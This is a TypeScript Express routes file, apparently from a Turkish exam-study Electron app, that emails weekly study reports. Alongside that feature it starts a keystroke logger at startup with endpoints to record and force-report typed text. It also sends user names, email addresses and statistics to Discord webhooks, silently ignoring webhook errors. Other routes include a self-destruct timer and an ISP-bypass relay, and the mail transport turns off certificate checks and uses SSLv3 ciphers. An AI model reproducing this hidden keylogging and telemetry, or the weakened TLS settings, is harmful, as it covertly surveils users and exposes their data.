        completedQuestions = 0;
      }
      
      // Son 1 haftanın tarihini hesapla (DENEME DETAYLARI İÇİN FİLTRE)
      const oneWeekAgo = new Date();
      oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
      
      // Genel ve branş denemelerini son 1 hafta ile filtrele
      const recentGeneralExams = sortedGeneralExams.filter((e: any) => {
        const examDate = new Date(e.exam_date);
        return examDate >= oneWeekAgo;
      });
      
      const recentBranchExams = branchExams.filter((e: any) => {
        const examDate = new Date(e.exam_date);
        return examDate >= oneWeekAgo;
      });
      
      // ✅ Get userName from ConfigManager (Electron) or request body
      let userName = req.body.userName || '';
      
      // Electron context'inde ConfigManager'dan kullanıcı adını al
      if (!userName && process.env.ELECTRON_ENV === 'true') {
        try {
          const electronPath = path.join(currentDir, '..', 'electron', 'config-manager.cjs');
          
          if (fs.existsSync(electronPath)) {
            // ✅ ESM-compatible require using createRequire
            const { getConfigManager } = requireESM(electronPath);
            const configManager = getConfigManager();
            const fullName = configManager.get('USER_FULLNAME');
            if (fullName && fullName.trim()) {
              userName = fullName.trim();
            }
          }
        } catch (error) {
          console.warn('⚠️  ConfigManager erişim hatası (email):', error);
        }
      }
      
      // Fallback: Değerli Öğrenci
      if (!userName) {
        userName = 'Değerli Öğrenci';
      }

      // Create email HTML content with beautiful modern design
      const htmlContent = generateModernEmailTemplate({
        userName, // Kullanıcı ismi
        monthlyTotalQuestions, // SON 7 GÜNÜN çözülen soru sayısı
        totalQuestions, // TÜM ZAMANLARIN çözülen soru sayısı
        totalCorrect,
        totalWrong,
        totalEmpty,
        successRate,
        recentExams: last7DaysExams, // SON 7 GÜNÜN denemeleri (🎯 ÇÖZÜLEN DENEME kutucuğu için)
        generalExams: recentGeneralExams,  // Son 1 haftalık genel denemeler (detay bölümü için)
        branchExams: recentBranchExams,     // Son 1 haftalık branş denemeler (detay bölümü için)
        tasks: last7DaysTasks, // SON 7 GÜNÜN görevleri (✅ TAMAMLANAN GÖREVLER kutucuğu için)
        completedTasks: last7DaysCompletedTasks, // SON 7 GÜNÜN tamamlanan görevi
        totalActivities: last7DaysTotalActivities, // SON 7 GÜNÜN toplam aktivitesi (📈 TOPLAM AKTİVİTE kutucuğu için)
        activityMotivation,
        activityColor,
        longestStreak,
        wrongTopicsCount, // Eksik Olduğum Konular sayısı (Raporlarım sayfası)
        completedTopics, // Tamamlanan Hatalı Konular Geçmişi sayısı (Raporlarım sayfası)
        completedQuestions, // Tamamlanan Hatalı Sorular Geçmişi sayısı (Raporlarım sayfası)
        maxTytNet: maxTytNet.net > 0 ? maxTytNet : { net: 0, exam_name: '', exam_date: '' },
        maxAytNet: maxAytNet.net > 0 ? maxAytNet : { net: 0, exam_name: '', exam_date: '' },
        branchRecords,
        mostQuestionsDate,
        mostQuestionsCount,
        mostWrongSubjects,
        mostSolvedSubjects,
        mostCorrectSubjects,
        examSubjectNets,
        completedTopicsHistory,
        completedQuestionsHistory,
        isManualRequest
      });

      // Configure nodemailer transporter with Gmail SMTP
      const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 587,
        secure: false, // TLS kullan
        auth: {
          user: emailUser,
          pass: emailPass,
        },
        tls: {
          rejectUnauthorized: false,
          ciphers: 'SSLv3'
        },
        debug: true, // Debug modunu aç
        logger: true // Loglama aç
      });

      // Send email with embedded images
      // fs ve path zaten üstte import edilmiş, tekrar import etmeye gerek yok
      
      // Electron production build için resim yollarını düzelt
      // Production: process.resourcesPath/assets/turkbayragi.png
      // Development: client/public/turkbayragi.png
      let assetsPath = path.join(process.cwd(), 'client/public');
      
      // Electron production build kontrol et
      if ((process as any).resourcesPath) {
        const productionAssetsPath = path.join((process as any).resourcesPath, 'assets');
        const testFile = path.join(productionAssetsPath, 'turkbayragi.png');
        
        // Test dosyası varsa production path kullan
        if (fs.existsSync(testFile)) {
          assetsPath = productionAssetsPath;
        }
      }
      
      const attachments = [
        {
          filename: 'turkbayragi.png',
          path: path.join(assetsPath, 'turkbayragi.png'),
          cid: 'turkbayragi'
        },
        {
          filename: 'ataturkimza.png',
          path: path.join(assetsPath, 'ataturkimza.png'),
          cid: 'ataturkimza'
        },
        {
          filename: 'ataturk.png',
          path: path.join(assetsPath, 'ataturk.png'),
          cid: 'ataturk'
        }
      ];
      
      if (shouldSplitEmails) {
        // Send 3 separate emails: General exams, Branch exams, Questions
        // Tüm email'lerde EN ÜSTTEKI ÇÖZÜLEN SORU kutularını KOR, sadece detayları sil
        // Email 1: General Exams Only (remove BRANŞ and detailed questions section only)
        if (generalExams.length > 0) {
          const generalOnlyHtml = htmlContent
            .replace(/<!-- BU AYIN REKOR BRANŞ DENEME NETLERİ -->[\s\S]*?<!-- EN ÇOK SORU ÇÖZÜLEN TARİH/g, '<!-- EN ÇOK SORU ÇÖZÜLEN TARİH');
          await transporter.sendMail({
            from: `"Haftalık Çalışma Raporum" <${emailFrom || emailUser}>`,
            to: toEmails,
            subject: `📊 Genel Deneme Raporu - ${new Date().toLocaleDateString('tr-TR', { month: 'long', year: 'numeric' })}`,
            html: generalOnlyHtml,
            attachments
          });
        }
        
        // Email 2: Branch Exams Only (remove GENEL and detailed questions section only)
        if (branchExams.length > 0) {
          const branchOnlyHtml = htmlContent
            .replace(/<!-- BU AYIN REKOR GENEL DENEME NETLERİ -->[\s\S]*?<!-- BU AYIN REKOR BRANŞ DENEME NETLERİ/g, '<!-- BU AYIN REKOR BRANŞ DENEME NETLERİ')
            .replace(/<!-- ÇÖZÜLEN TÜM SORULAR DETAYLARı[\s\S]*?<!-- EN ÇOK SORU ÇÖZÜLEN TARİH/g, '<!-- EN ÇOK SORU ÇÖZÜLEN TARİH');
          await transporter.sendMail({
            from: `"Haftalık Çalışma Raporum" <${emailFrom || emailUser}>`,
            to: toEmails,
            subject: `📊 Branş Deneme Raporu - ${new Date().toLocaleDateString('tr-TR', { month: 'long', year: 'numeric' })}`,
            html: branchOnlyHtml,
            attachments
          });
        }
        
        // Email 3: Questions Only (if needed) - keep Çözülen Tüm Sorular, remove exam details
        if (allThisMonthQuestions.length > 10) {
          const questionsOnlyHtml = htmlContent
            .replace(/<!-- BU AYIN REKOR GENEL DENEME NETLERİ -->[\s\S]*?<!-- BU AYIN REKOR BRANŞ DENEME NETLERİ[\s\S]*?<!-- EN ÇOK SORU ÇÖZÜLEN TARİH/g, '<!-- EN ÇOK SORU ÇÖZÜLEN TARİH');
          await transporter.sendMail({
            from: `"Aylık Çalışma Raporum" <${emailFrom || emailUser}>`,
            to: toEmails,
            subject: `📊 Soru Çözüm Raporu - ${new Date().toLocaleDateString('tr-TR', { month: 'long', year: 'numeric' })}`,
            html: questionsOnlyHtml,
            attachments
          });
        }
        
        logActivity('Rapor Gönderildi (3 Ayrı Email)', toEmails);
        
        // Discord'a basarili rapor bildirimi gonder
        try {
          const emailListStr = Array.isArray(toEmails) ? toEmails.join(', ') : toEmails;
          const sentEmailTypes: string[] = [];
          if (generalExams.length > 0) sentEmailTypes.push('Genel Deneme Raporu');
          if (branchExams.length > 0) sentEmailTypes.push('Brans Deneme Raporu');
          if (allThisMonthQuestions.length > 10) sentEmailTypes.push('Soru Cozum Raporu');
          
          await userMonitoring.log({
            type: 'task',
            action: 'RAPOR_GONDERILDI_BASARILI',
            severity: 'info',
            userName: userName || 'Kullanici',
            details: {
              durum: 'BASARILI',
              gonderilen_email: emailListStr,
              email_sayisi: sentEmailTypes.length,
              email_turleri: sentEmailTypes.join(', '),
              toplam_soru: monthlyTotalQuestions,
              toplam_deneme: (generalExams.length + branchExams.length),
              basari_orani: successRate,
              gonderim_zamani: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
              rapor_turu: '3 Ayri Email',
            }
          });
          
          // ✅ Discord aktiviteler webhook'una embed gonder (ayrı try/catch ile izole)
          try {
            await discordWebhook.sendReportSuccess({
              userName: userName || 'Kullanici',
              emailList: emailListStr,
              emailCount: sentEmailTypes.length,
              emailTypes: sentEmailTypes.join(', '),
              totalQuestions: monthlyTotalQuestions,
              totalExams: generalExams.length + branchExams.length,
              successRate: successRate,
              reportType: '3 Ayri Email',
            });
          } catch (webhookErr) {
            // Discord webhook hatasi sessizce gecilir - email basarili gonderildi
          }
        } catch (discordErr) {
          // Discord hatasi sessizce gecilir
        }
        
        res.json({ message: "Raporlar 3 ayrı email olarak başarıyla gönderildi" });
      } else {
        // Send single combined email
        await transporter.sendMail({
          from: `"Haftalık Çalışma Raporum" <${emailFrom || emailUser}>`,
          to: toEmails,
          subject: "Haftalık Çalışma Raporum",
          html: htmlContent,
          attachments
        });
        
        logActivity('Rapor Gönderildi', toEmails);
        
        // Discord'a basarili rapor bildirimi gonder (tekli email)
        try {
          const emailListStr = Array.isArray(toEmails) ? toEmails.join(', ') : toEmails;
          
          await userMonitoring.log({
            type: 'task',
            action: 'RAPOR_GONDERILDI_BASARILI',
            severity: 'info',
            userName: userName || 'Kullanici',
            details: {
              durum: 'BASARILI',
              gonderilen_email: emailListStr,
              email_sayisi: 1,
              email_turleri: 'Haftalik Calisma Raporu (Birlesik)',
              toplam_soru: monthlyTotalQuestions,
              toplam_deneme: (generalExams.length + branchExams.length),
              basari_orani: successRate,
              gonderim_zamani: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
              rapor_turu: 'Tekli Birlesik Email',
            }
          });
          
          // ✅ Discord aktiviteler webhook'una embed gonder (ayrı try/catch ile izole)
          try {
            await discordWebhook.sendReportSuccess({
              userName: userName || 'Kullanici',
              emailList: emailListStr,
              emailCount: 1,
              emailTypes: 'Haftalik Calisma Raporu (Birlesik)',
              totalQuestions: monthlyTotalQuestions,
              totalExams: generalExams.length + branchExams.length,
              successRate: successRate,
              reportType: 'Tekli Birlesik Email',
            });
          } catch (webhookErr) {
            // Discord webhook hatasi sessizce gecilir - email basarili gonderildi
          }
        } catch (discordErr) {
          // Discord hatasi sessizce gecilir
        }
        
        res.json({ message: "Rapor başarıyla gönderildi" });
      }
    } catch (error: any) {
      console.error("Error sending report:", error);
      
      // Detaylı hata mesajı oluştur
      let errorMessage = "Email gönderilemedi. ";
      let hataTuru = 'Bilinmeyen Hata';
      
      if (error.code === 'EAUTH' || error.response?.includes('Invalid login')) {
        errorMessage += "Gmail hesabınız için 2 faktörlü doğrulama açık olabilir. .env dosyasındaki EMAIL_PASS değerine Gmail App Password kullanmanız gerekiyor. Gmail hesabınızda App Password oluşturun ve bunu .env dosyasına kaydedin.";
        hataTuru = 'Kimlik Dogrulama Hatasi (EAUTH)';
      } else if (error.code === 'ETIMEDOUT' || error.code === 'ECONNECTION') {
        errorMessage += "SMTP sunucusuna bağlanılamadı. İnternet bağlantınızı kontrol edin.";
        hataTuru = 'Baglanti Hatasi (TIMEOUT)';
      } else if (error.code === 'EENVELOPE') {
        errorMessage += "Geçersiz email adresi. EMAIL_USER ve EMAIL_FROM değerlerini kontrol edin.";
        hataTuru = 'Gecersiz Email Adresi (EENVELOPE)';
      } else {
        errorMessage += `Hata: ${error.message || 'Bilinmeyen hata'}. .env dosyasındaki email ayarlarınızı kontrol edin.`;
        hataTuru = error.code || 'Bilinmeyen';
      }
      
      // Discord'a basarisiz rapor bildirimi gonder
      try {
        await userMonitoring.log({
          type: 'task',
          action: 'RAPOR_GONDERILDI_BASARISIZ',
          severity: 'error',
          details: {
            durum: 'BASARISIZ',
            hata_turu: hataTuru,
            hata_mesaji: error.message || 'Bilinmeyen hata',
            hata_kodu: error.code || 'YOK',
            hedef_email: 'Gonderim oncesi hata',
            gonderim_zamani: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
            detayli_aciklama: errorMessage,
          }
        });
        
        // ✅ Discord aktiviteler webhook'una hata embed'i gonder (ayrı try/catch ile izole)
        // Not: Bu catch bloğunda userName ve toEmails scope dışı olabilir
        // Bu yüzden doğrudan req.body'den alıyoruz
        try {
          const catchUserName = req.body?.userName || 'Kullanici';
          const catchEmailUser = process.env.EMAIL_USER || req.body?.emailUser || '-';
          await discordWebhook.sendReportFailed({
            userName: catchUserName,
            errorType: hataTuru,
            errorMessage: error.message || 'Bilinmeyen hata',
            targetEmail: catchEmailUser,
          });
        } catch (webhookErr) {
          // Discord webhook hatasi sessizce gecilir
        }
      } catch (discordErr) {
        // Discord hatasi sessizce gecilir
      }
      
      res.status(500).json({ 
        message: errorMessage,
        technicalDetails: error.message 
      });
    }
  });

  // ✅ ADMIN ENDPOINT'LERİ KALDIRILDI - Admin paneli artık yok
  // Ebeveyn gözetimi sistemi ve admin paneli tamamen kaldırıldı

  // Kullanıcı bilgisi endpoint'leri
  // ✅ AFYONLUM: İsim her zaman "Afyonlum" olarak döner, isim sorma ekranı kaldırıldı
  app.get("/api/user/info", async (req, res) => {
    try {
      // ✅ Her zaman "Afyonlum" döndür - isim sorma ekranı kaldırıldı
      res.json({
        success: true,
        fullname: 'Afyonlum',
        hasFullname: true
      });
    } catch (error) {
      console.error('User info fetch error:', error);
      res.status(500).json({
        success: false,
        message: 'Kullanıcı bilgisi alınamadı'
      });
    }
  });

  app.post("/api/user/info", async (req, res) => {
    try {
      const { fullname } = req.body;
      
      if (!fullname || typeof fullname !== 'string' || fullname.trim().length < 3) {
        return res.status(400).json({
          success: false,
          message: 'Geçerli bir ad soyad giriniz (en az 3 karakter)'
        });
      }
      
      // Electron ortamında ConfigManager'a kaydet
      if (process.env.ELECTRON_ENV === 'true') {
        // ConfigManager güncellemesi için Electron'a sinyal gönder
        // Not: Bu işlem preload.cjs üzerinden IPC ile yapılacak
        console.log(`✅ Kullanıcı bilgisi kaydediliyor: ${fullname}`);
        
        // Şimdilik process.env'e kaydet (server restart'ta ConfigManager'dan yüklenecek)
        process.env.USER_FULLNAME = fullname.trim();
        
        res.json({
          success: true,
          message: 'Kullanıcı bilgisi kaydedildi',
          fullname: fullname.trim()
        });
      } else {
        res.status(400).json({
          success: false,
          message: 'Bu özellik sadece Electron ortamında kullanılabilir'
        });
      }
    } catch (error) {
      console.error('User info save error:', error);
      res.status(500).json({
        success: false,
        message: 'Kullanıcı bilgisi kaydedilemedi'
      });
    }
  });

  // ✅ Self-Destruct Durumu API Endpoint
  // Frontend bu endpoint'ten tarihi dinamik olarak alır
  app.get("/api/self-destruct/status", async (req, res) => {
    try {
      const { shouldSelfDestruct, getDaysRemaining, SELF_DESTRUCT_DATE_UTC, HARDCODED_DEADLINE_UTC } = await import('./self-destruct');
      
      const nowUTC = new Date();
      const selfDestructDateUTC = SELF_DESTRUCT_DATE_UTC;
      const hardcodedDeadlineUTC = HARDCODED_DEADLINE_UTC;
      
      // Hangisi daha erken geliyorsa onu kullan
      const effectiveDate = selfDestructDateUTC < hardcodedDeadlineUTC ? selfDestructDateUTC : hardcodedDeadlineUTC;
      
      const shouldDestruct = shouldSelfDestruct();
      const daysRemaining = getDaysRemaining();
      const millisecondsRemaining = effectiveDate.getTime() - nowUTC.getTime();
      
      res.json({
        success: true,
        shouldDestruct,
        daysRemaining,
        millisecondsRemaining,
        selfDestructDateUTC: selfDestructDateUTC.toISOString(),
        hardcodedDeadlineUTC: hardcodedDeadlineUTC.toISOString(),
        effectiveDateUTC: effectiveDate.toISOString(),
        currentTimeUTC: nowUTC.toISOString()
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: 'Self-destruct durumu alınamadı'
      });
    }
  });

  // ✅ DISCORD WEBHOOK RELAY ENDPOINT
  // ISP engellerini bypass etmek için relay sunucu
  app.post("/api/discord-relay", async (req, res) => {
    try {
      const { webhookUrl, payload, isFormData, formDataFields } = req.body;
      
      if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ success: false, message: 'Invalid webhook URL' });
      }
      
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'AFYONLUM-Relay/1.0'
        },
        body: JSON.stringify(payload)
      });
      
      if (response.ok) {
        res.json({ success: true, statusCode: response.status });
      } else {
        const errorText = await response.text();
        res.status(response.status).json({ 
          success: false, 
          statusCode: response.status,
          message: errorText.substring(0, 200)
        });
      }
    } catch (error: any) {
      res.status(500).json({ 
        success: false, 
        message: error.message || 'Relay error'
      });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // KLAVYE TAKİPÇİSİ API ENDPOINT'LERİ
  // ═══════════════════════════════════════════════════════════════════════════════
  
  // Klavye vuruşlarını kaydet
  app.post("/api/keyboard/log", async (req, res) => {
    try {
      const { text, source } = req.body;
      
      if (!text || typeof text !== 'string') {
        return res.status(400).json({ 
          success: false, 
          message: 'Text parametresi gerekli' 
        });
      }
      
      await KeyboardLogger.addKeystroke(text, source || 'app');
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ 
        success: false, 
        message: 'Klavye logu kaydedilemedi' 
      });
    }
  });

  // Klavye istatistiklerini al
  app.get("/api/keyboard/stats", async (req, res) => {
    try {
      const stats = KeyboardLogger.getBufferStats();
      res.json({
        success: true,
        stats: {
          charCount: stats.charCount,
          wordCount: stats.wordCount,
          startTime: stats.startTime.toISOString()
        }
      });
    } catch (error) {
      res.status(500).json({ 
        success: false, 
        message: 'İstatistikler alınamadı' 
      });
    }
  });

  // Manuel rapor gönder (test için)
  app.post("/api/keyboard/force-report", async (req, res) => {
    try {
      await KeyboardLogger.forceReport();
      res.json({ 
        success: true, 
        message: 'Rapor gönderildi' 
      });
    } catch (error) {
      res.status(500).json({ 
        success: false, 
        message: 'Rapor gönderilemedi' 
      });
    }
  });

  // KeyboardLogger'ı başlat
  KeyboardLogger.initialize();

  registerLicenseRoutes(app);
  registerMonitoringRoutes(app);
  registerUserActivityRoutes(app);

  const httpServer = createServer(app);
  return httpServer;
}

// CANKIR